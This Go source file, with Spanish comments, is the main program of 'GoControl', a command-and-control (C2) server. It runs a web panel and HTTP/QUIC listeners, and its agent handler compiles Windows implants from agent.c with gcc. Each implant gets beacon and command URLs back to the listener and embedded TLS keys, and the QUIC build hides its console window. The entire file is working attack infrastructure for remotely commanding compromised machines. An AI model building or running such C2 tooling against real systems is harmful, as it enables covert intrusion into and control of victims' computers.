package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"database/sql"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"text/template"
	"time"

	// Importo database.go en /Web/Database/database.go
	"gocontrol/Web/database"
	"gocontrol/Web/models"

	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
)

type Name struct {
	ID   int
	Name string
}

func main() {
	print("GoControl v0.1 - C2 Server\n")

	// Inicializo la base de datos
	database.Init()

	http.HandleFunc("/", indexHandler(database.GetDatabase()))
	http.HandleFunc("/agents/", agentsHandler(database.GetDatabase()))
	http.HandleFunc("/listeners/", listenersHandler(database.GetDatabase()))

	// CSS
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./Web/static/"))))

	//* Inicializo todos los listeners ya creados
	listeners, err := models.GetListeners(database.GetDatabase())
	if err != nil {
		fmt.Println(err)
	}

	for _, listener := range listeners {
		if listener.Type == "HTTP" {
			listener.CreateListenerHttp(database.GetDatabase())
		} else if listener.Type == "QUIC" {
			listener.CreateListenerQUIC(database.GetDatabase())
		}
	}

	// Inicio el servidor web
	fmt.Println("Servidor web en http://localhost:8080")

	http.ListenAndServe(":8080", nil)

}

func indexHandler(db *sql.DB) func(http.ResponseWriter, *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {

		// Obtengo los listener y los agentes de la base de datos
		listeners, err := models.GetListeners(db)
		if err != nil {
			fmt.Println(err)
		}

		agents, err := models.GetAgents(db)
		if err != nil {
			fmt.Println(err)
		}

		// Creo la template HTML y renderizo los datos
		tmpl := template.Must(template.ParseFiles("Web/static/index.html"))
		err = tmpl.Execute(w, struct {
			Listeners []models.Listener
			Agents    []models.Agent
		}{
			listeners,
			agents,
		})
		if err != nil {
			panic(err)
		}

	}
}

func agentsHandler(db *sql.DB) func(http.ResponseWriter, *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {

		if r.Method == "POST" {

			// Obtengo los datos del formulario
			// Print all form values
			beacon := r.FormValue("beacon")
			listener_os := r.FormValue("os")
			arquitecture := r.FormValue("arquitecture")
			uuid_type := r.FormValue("UUID")

			// uuid_type = UUID+Type
			listener_uuid := strings.Split(uuid_type, "+")[0]
			listener_type := strings.Split(uuid_type, "+")[1]
			listener_socket := strings.Split(uuid_type, "+")[2]

			if listener_type == "HTTP" {

				if listener_os == "Windows" {
					if arquitecture == "x64" {

						// Creo el comando gcc para compilar el agente de C
						newAgentUUID := uuid.New().String()
						pathToAgentC := "Agentes/"
						print("Nuevo agente: " + newAgentUUID + " Path: " + pathToAgentC + " Tipo: " + listener_type + " Beacon: " + beacon + " OS: " + listener_os + " Arquitectura: " + arquitecture + " UUID: " + listener_uuid + "\n")

						cmd := exec.Command("gcc",
							"-D", `AGENT_ID="`+newAgentUUID+`"`,
							"-D", `NEW_URL="http://`+listener_socket+`/`+listener_uuid+`/`+newAgentUUID+`/new"`,
							"-D", `COMMAND_URL="http://`+listener_socket+`/`+listener_uuid+`/`+newAgentUUID+`/cmd"`,
							"-D", "BEACON_INTERVAL="+beacon,
							"-D", "TYPE=HTTP",
							pathToAgentC+"agent.c",
							"-o", "agent",
							"-lcurl",
							"-s",
							//! "-mwindows",
						)

						out, err := cmd.CombinedOutput()
						if err != nil {
							fmt.Printf("Output: %s", out)
							fmt.Printf("Error: %v\n", err)
						}

						print("Se ha compilado el agente agent.exe (HTTP)\n")

					} else if arquitecture == "x86" {
						print("Agente aún no soportado\n")
					}
				} else if listener_os == "Linux" {
					print("Agente aún no soportado\n")
				}

			} else if listener_type == "QUIC" {
				//? Creo el certificado y key para el agente (QUIC)
				priv, err := rsa.GenerateKey(rand.Reader, 2048)
				if err != nil {
					log.Fatal(err)
				}

				privBytes := x509.MarshalPKCS1PrivateKey(priv)
				privPem := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: privBytes})

				fmt.Println("Agent private key: " + string(privPem))

				//? Creo el certificado
				template := x509.Certificate{
					SerialNumber: big.NewInt(1),
					Subject: pkix.Name{
						CommonName: "127.0.0.1",
					},
					NotBefore:             time.Now(),
					NotAfter:              time.Now().Add(365 * 24 * time.Hour), // 1 year
					KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
					ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
					BasicConstraintsValid: true,
				}

				// derBytes es el certificado en formato DER
				derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
				if err != nil {
					log.Fatal(err)
				}

				certPem := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})

				fmt.Println("Agent Certificate: ", string(certPem))

				// Los certificados se crean en el directorio /certs con el UUID del listener
				//? Creo el directorio para los certificados
				if _, err := os.Stat("certs/" + listener_uuid); os.IsNotExist(err) {
					os.MkdirAll("certs/"+listener_uuid+"", 0755)
				}

				//? Las paso a string
				certPemBase64 := base64.StdEncoding.EncodeToString(certPem)
				privPemBase64 := base64.StdEncoding.EncodeToString(privPem)

				//! Leo el certificado del listener
				//? Obtengo el certificado del listener
				serverPem, err := os.ReadFile("certs/" + listener_uuid + "/cert.pem")
				if err != nil {
					log.Fatal(err)
				}

				//? Lo paso a base64
				serverPemBase64 := base64.StdEncoding.EncodeToString(serverPem)

				// Creo el comando gcc para compilar el agente de C
				newAgentUUID := uuid.New().String()
				pathToAgentC := "Agentes/"
				print("Nuevo agente: " + newAgentUUID + " Path: " + pathToAgentC + " Tipo: " + listener_type + " Beacon: " + beacon + " OS: " + listener_os + " Arquitectura: " + arquitecture + " UUID: " + listener_uuid + "\n")

				cmd := exec.Command("gcc",
					"-D", `AGENT_ID="`+newAgentUUID+`"`,
					"-D", `NEW_URL="https://`+listener_socket+`/`+listener_uuid+`/`+newAgentUUID+`/new"`,
					"-D", `COMMAND_URL="https://`+listener_socket+`/`+listener_uuid+`/`+newAgentUUID+`/cmd"`,
					"-D", "BEACON_INTERVAL="+beacon,
					"-D", `TYPE="QUIC"`,
					"-D", `CERT="`+certPemBase64+`"`,
					"-D", `KEY="`+privPemBase64+`"`,
					"-D", `SERVER_CERT="`+serverPemBase64+`"`,
					pathToAgentC+"agent.c",
					"-o", "agent",
					"-lcurl",
					"-lssl",
					"-lcrypto",
					"-lws2_32",
					"-lbcrypt",
					"-s",
					"-mwindows",
				)

				out, err := cmd.CombinedOutput()
				if err != nil {
					fmt.Printf("Output: %s", out)
					fmt.Printf("Error: %v\n", err)
				}

				print("Se ha compilado el agente agent.exe (QUIC)\n")

			}

		} else if r.Method == "GET" {

			//* Obtengo los agentes de la base de datos
			agents, err := models.GetAgents(db)
			if err != nil {
				fmt.Println(err)
			}

			//* Obtengo los listener de la base de datos
			listeners, err := models.GetListeners(db)
			if err != nil {
				fmt.Println(err)
			}

			// Creo la template HTML y renderizo los datos
			tmpl := template.Must(template.ParseFiles("Web/static/agents.html"))

			// Send listener struct and data array to template
			err = tmpl.Execute(w, struct {
				Agents    []models.Agent
				Listeners []models.Listener
			}{agents, listeners})

			if err != nil {
				panic(err)
			}

		}

	}
}

func listenersHandler(db *sql.DB) func(http.ResponseWriter, *http.Request) {

	return func(w http.ResponseWriter, r *http.Request) {

		// Si el método es POST es porque es para crear un listener
		if r.Method == "POST" {
			print("Parámetros recibidos: ")

			// Obtengo los parámetros del formulario
			name := strings.TrimSpace(r.FormValue("name"))
			listener_type := strings.TrimSpace(r.FormValue("type"))
			ip := strings.TrimSpace(r.FormValue("ip"))
			port := strings.TrimSpace(r.FormValue("port"))

			new_listener := models.Listener{
				UUID:         uuid.New().String(),
				Name:         name,
				Type:         listener_type,
				Socket:       ip + ":" + port,
				CreationDate: time.Now().Format("15-01-2006 15:04:05"),
				Online:       true,
			}

			if new_listener.Type == "HTTP" {
				new_listener.CreateListenerHttp(db)
			} else if new_listener.Type == "QUIC" {
				new_listener.CreateListenerQUIC(db)
			}

		} else if r.Method == "GET" {

			// Obtengo los listener de la base de datos
			listeners, err := models.GetListeners(db)
			if err != nil {
				fmt.Println(err)
			}

			tmp := template.Must(template.ParseFiles("Web/static/listeners.html"))

			err = tmp.Execute(w, struct{ Listeners []models.Listener }{listeners})
			if err != nil {
				panic(err)
			}

		}

	}
}
